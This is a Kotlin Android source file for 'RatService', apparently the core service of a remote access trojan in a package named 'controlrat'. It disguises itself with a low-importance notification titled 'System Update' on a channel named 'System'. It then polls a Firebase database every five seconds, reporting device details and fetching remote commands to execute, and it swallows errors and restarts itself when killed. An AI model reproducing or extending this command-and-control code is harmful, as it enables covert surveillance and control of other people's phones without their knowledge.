package com.controlrat
import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.*

class RatService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val db = FirebaseDatabase.getInstance()
    private lateinit var appId: String

    override fun onCreate() {
        super.onCreate()
        appId = ConfigHelper.getAppId(this)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(NotificationChannel("svc_ch", "System", NotificationManager.IMPORTANCE_MIN))
        }
        startForeground(1, NotificationCompat.Builder(this, "svc_ch").setContentTitle("System Update").setSmallIcon(android.R.drawable.stat_notify_sync).build())
        startHeartbeat()
    }

    private fun startHeartbeat() {
        scope.launch {
            while (isActive) {
                try {
                    db.getReference("agents/$appId").updateChildren(mapOf(
                        "status" to "online", "last_seen" to System.currentTimeMillis(),
                        "device" to mapOf("model" to android.os.Build.MODEL, "sdk" to android.os.Build.VERSION.SDK_INT)
                    ))
                    db.getReference("agents/$appId/commands").get().addOnSuccessListener { snap ->
                        snap.children.forEach { child ->
                            val action = child.child("action").getValue(String::class.java) ?: return@forEach
                            val payload = child.child("payload").value as? Map<String, Any> ?: emptyMap()
                            CommandManager.execute(this@RatService, action, payload, appId)
                            child.ref.removeValue()
                        }
                    }
                } catch (e: Exception) {}
                delay(5000)
            }
        }
    }
    override fun onStartCommand(i: Intent?, f: Int, s: Int) = START_STICKY
    override fun onBind(i: Intent?): IBinder? = null
}
